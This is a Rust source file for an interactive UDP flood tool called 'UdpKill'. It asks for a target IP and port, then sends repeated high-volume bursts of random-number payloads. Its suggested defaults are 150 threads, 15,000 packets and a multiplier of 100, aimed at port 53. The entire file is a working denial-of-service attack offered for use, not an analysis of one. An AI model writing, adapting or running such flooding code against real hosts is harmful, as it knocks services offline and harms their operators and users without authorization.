
use std::net::UdpSocket;
use std::process::Command;
use std::thread::{self, sleep};
use std::time::Duration;

use rand::Rng;

use get_io::get_input; // console input

mod get_io {
    use std::io;
    pub fn get_input(prompt: &str) -> String {
        print!("{}\n", prompt);
        let mut input: String = String::new();
        io::stdin().read_line(&mut input).expect("Err reading line!");
        return input;
    }

}

struct UdpKill {
    ip: String,        // TARGET IP
    port: i32,          // TARGET PORT
    tries: i16,         // AMNT OF TRIES
    packets: i32,       // TOTAL PACKETS
    multiplier: i16,    // PACKET MULTIPLIER (packets x multiplier = total packets)
    trydelay: u64,      // DELAY BETWEEN TRIES (total packets x tries = final amnt)
    senddelay: u64,     // SEND DELAY BETWEEN PACKETS (time between each packet x multiplier)
    packetsize: i16,    // PACKET/DATA SIZE
    threads: i16,       // AMNT OF CONCURRENT THREADS
}

impl UdpKill {
    fn new(ip: String, port: i32, tries: i16, packets: i32, multiplier: i16, trydelay: u64, senddelay: u64, packetsize: i16, threads: i16) -> Self {
        UdpKill { // spooky
            ip: ip, //String::from("1.2.3.4"),
            port: port, //53,
            tries: tries, //10,
            packets: packets, //15000,
            multiplier: multiplier, //100,
            trydelay: trydelay, //1,
            senddelay: senddelay, //1,
            packetsize: packetsize, //3100,
            threads: threads, //150,
        }
    }

    fn udp_attack (&self) -> () {

        let data: String = self.f64_data();

        for x in 0..self.tries {            // TRIES
            for y in 0..self.packets {      // PACKETS
                for z in 0..self.threads {  // THREADS
                    let udp: () = self.udp_packet(data.clone());
                    thread::spawn(move || {
                        udp.clone() // udp packet
                    });
                    println!("Target: {0} -- Port: {1}\nTries: {2} -- Packets: {3} -- Threads: {4}\n", self.ip, self.port, x+1, y+1, z+1);
                }
                let _: std::process::ExitStatus = Command::new("cmd.exe").arg("/C").arg("cls").status().unwrap();
                sleep(Duration::from_millis(self.senddelay));
            }
            sleep(Duration::from_millis(self.trydelay));
        }
    }

    fn udp_packet (&self, data: String) -> () {
        match UdpSocket::bind("0.0.0.0:0") {
            Ok(socket) => {
                socket.set_nonblocking(false).expect("Failed to set blocking mode."); // set blocking mode
                let addr: String = format!("{}:{}", self.ip.to_string(), self.port.to_string()); // format ip:port
                for _ in 0..self.multiplier {
                    if let Err(e) = socket.send_to(data.as_bytes(), &addr) { // send data
                        eprintln!("Packet Fail!: {}", e);
                    }
                    //println!("Sent packet! {}", i)
                }
            }
            Err(e) => {
                eprintln!("Failed to bind: {}", e);
            }
        }
    }

    fn f64_data (&self) -> String { // f64 data
        let mut rng = rand::thread_rng();
        let data: String = (0..self.packetsize)
            .map(|_| rng.gen::<f64>().to_string())
            .collect::<Vec<String>>()
            .join("\n");
        //println!("{}", data);
        return data;
    }

    /*
    fn corrupt_data(&self, data: &str) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut input_bytes: Vec<u8> = data.bytes().collect();

        for byte in input_bytes.iter_mut() {
            if rng.gen::<f64>() < 0.5 {
                *byte ^= 0x00;
            }
        }

        return input_bytes;
    }
    */
}

fn main() {
    loop {
        let ip: String = get_input("IP:\t").trim().parse().unwrap();
        let port: i32 = get_input("PORT (Ex: 53):\t").trim().parse().unwrap();
        let tries: i16 = get_input("TRIES (Ex: 10):\t").trim().parse().unwrap();
        let packets: i32 = get_input("PACKETS (Ex: 15000):\t").trim().parse().unwrap();
        let multiplier: i16 = get_input("MULTIPLIER (Ex: 100):\t").trim().parse().unwrap();
        let trydelay: u64 = get_input("TRY DELAY (Ex: 1):\t").trim().parse().unwrap();
        let senddelay: u64 = get_input("SEND DELAY (Ex: 1):\t").trim().parse().unwrap();
        let packetsize: i16 = get_input("PACKET SIZE (Ex: 3100):\t").trim().parse().unwrap();
        let threads: i16 = get_input("THREADS (Ex: 150):\t").trim().parse().unwrap();

        get_input("Start?\n");
        
        let udpkill: UdpKill = UdpKill::new(ip, port, tries, packets, multiplier, trydelay, senddelay, packetsize, threads);

        udpkill.udp_attack();
    }
    
}
